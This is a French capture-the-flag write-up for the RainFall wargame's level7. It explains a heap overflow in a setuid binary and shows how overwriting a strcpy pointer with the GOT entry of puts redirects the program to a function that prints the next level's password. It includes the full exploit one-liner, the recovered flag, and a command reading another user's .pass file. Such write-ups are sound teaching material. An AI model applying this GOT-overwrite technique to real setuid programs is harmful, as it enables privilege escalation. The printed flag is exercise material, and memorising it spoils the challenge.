# LEVEL7

Le système de fichier se présente de cette manière :

```diff
level7@RainFall:~$ ls -la

total 17

dr-xr-x---+ 1 level7 level7   80 Mar  9  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
rw-r--r--  1 level7 level7  220 Apr  3  2012 .bash_logout
rw-r--r--  1 level7 level7 3530 Sep 23  2015 .bashrc
+rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7
rw-r--r--+ 1 level7 level7   65 Sep 23  2015 .pass
rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile
```

Le binaire possède le **SUID**, il est donc exécuté avec les privilèges de `level8`.

## Analyse

Le programme effectue 4 allocations de 8 octets :

```asm
malloc(8) → 0x0804a008
malloc(8) → 0x0804a018
malloc(8) → 0x0804a028
malloc(8) → 0x0804a038
```

Les deux premières allocations forment :

```text
data1:
0x0804a008 → 1
0x0804a00c → 0x0804a018

data2:
0x0804a028 → 2
0x0804a02c → 0x0804a038
```

Les arguments sont ensuite copiés avec `strcpy` :

```c
strcpy((char *)data1[1], argv[1]);
strcpy((char *)data2[1], argv[2]);
```

Les buffers ne font que **8 octets**, ce qui permet de provoquer un heap overflow.

## Exploitation

Avec :

```bash
ltrace ./level7 $(python2 -c 'print "A" * 24') $(python2 -c 'print "B" * 8')
```

on obtient :

```text
strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAAAAA")
strcpy(0x41414141, "BBBBBBBB")
```

Le premier `strcpy` écrase donc `data2[1]`.

On peut remplacer ce pointeur par l'adresse de la GOT de `puts` :

```text
0x08049928
```

Puis utiliser le deuxième `strcpy` pour écrire l'adresse de `m()` à cet emplacement.

Adresse de `m()` :

```text
0x080484f4
```

Lorsque le programme appelle ensuite :

```c
puts("~~");
```

l'appel est redirigé vers `m()`.

## Exploit

```bash
./level7 $(python2 -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python2 -c 'print "\xf4\x84\x04\x08"')
```

Résultat :

```text
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
- 1785247605
```

La fonction `m()` affiche le contenu de `c`, qui contient le mot de passe de `level8`.

```bash
cat /home/user/level8/.pass
```
